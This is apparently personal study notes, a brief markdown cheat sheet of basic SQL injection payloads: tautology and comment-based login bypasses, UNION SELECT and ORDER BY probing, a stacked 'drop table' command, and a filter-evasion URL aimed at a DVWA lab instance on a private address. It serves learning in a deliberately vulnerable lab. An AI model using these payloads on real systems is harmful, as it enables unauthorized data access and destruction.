# SQL injuctions
## Basic SQL injuctions syntax
``` 1' or 1='1 ```
``` 1' union select <row1>,<row2> from <tablename># ```
``` 1;drop table <tablename># ```

```` somepass' or 1=1 #     ````

# you can try with username

``` admin' # ```
``` name' order by 1#  ```

##Tampering URL and bypassing Filters

```We can try %23 instead of space add + /**/```

```192.168.56.102/dvwa/vulnerabilities/sqli/?id=1'+uNioN/**/sEleCt/**/1,2/**/%23&Submit=Submit#```
